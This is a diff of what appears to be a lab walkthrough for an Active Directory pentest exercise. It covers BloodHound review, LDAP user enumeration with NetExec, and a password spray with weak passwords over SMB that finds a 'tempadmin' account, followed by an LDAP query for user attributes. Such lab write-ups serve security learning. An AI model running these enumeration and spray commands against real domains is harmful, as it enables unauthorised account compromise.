@@ -1,19 +1,35 @@
-
 ### Our first mission is: Enumerate and extract domain user accounts for password spray targeting
+
+First thing I did was too go through node connections in bloodhound, especially `SSUPPORT@PENTESTLAB.local` user I saw, which was part of privileged groups. It had `Generic` and `AllExtendedRights` type of privileges on OUs and Users.
+
+<img width="3456" height="1687" alt="Screenshot From 2026-06-24 19-27-57" src="https://github.com/user-attachments/assets/eca13e89-908d-4464-a163-c7c17a0e138d" />
+
+---
+
+Then, I went for setting up a password spray:
+1. I would collect all users in a user.txt file.
+2. I would use the user.txt and some passwords I encountered during AS-REP Roasting, Kerberoasting, leaked credential hunting, like 'Password', 'Password123' 'User@2025!' 'Password1' etc.
 
 Blueprint:
 `nxc ldap [1. Target IP] -u [2. Active Username] -p '[3. Password]' --users | awk '/[4. Parsing Filter]/ {print $[5. Column Number]}' | tee [6. Output File]`
 
 Command:
 
-```bash
+
 # Phase 1: Enumerate all user objects via LDAP
+
+```bash
 nxc ldap 192.168.56.20 -u bh_intern -p 'User@2025!' --users
+```
 
 # Phase 2: Sanitize output and isolate raw usernames into a text list
-nxc ldap 192.168.56.20 -u bh_intern -p 'User@2025!' --users | awk '/LDAP.*DC01/ {print $5}' | tee users.txt
 
+```bash
+nxc ldap 192.168.56.20 -u bh_intern -p 'User@2025!' --users | awk '/LDAP.*DC01/ {print $5}' | tee users.txt
 ```
+
+<img width="2833" height="1822" alt="Screenshot From 2026-06-24 19-35-47" src="https://github.com/user-attachments/assets/8451e0e9-6287-4ca1-956b-323d7143fbf9" />
+
 
 Explanation:
 
@@ -47,6 +63,10 @@ nxc smb 192.168.56.20 -u users.txt -p 'Password123' --continue-on-success
 
 ```
 
+<img width="3382" height="1351" alt="Screenshot From 2026-06-24 19-35-23" src="https://github.com/user-attachments/assets/ec981cc4-6894-4f36-b262-641c1fcdb6af" />
+
+Found User: `tempadmin`
+
 Explanation:
 
 `nxc smb`: Launches the SMB protocol testing engine within NetExec to validate credentials against remote administration endpoints.
@@ -76,6 +96,10 @@ Command:
 nxc ldap 192.168.56.20 -u 'tempadmin' -p 'Password123' --base-dn "DC=PENTESTLAB,DC=local" --query "(sAMAccountName=*)" "cn telephoneNumber"
 
 ```
+
+
+<img width="2990" height="1565" alt="Screenshot From 2026-06-22 22-06-19" src="https://github.com/user-attachments/assets/86eaa7bc-7dc4-4086-b7c1-e31f0ae93653" />
+
 
 Explanation:
 
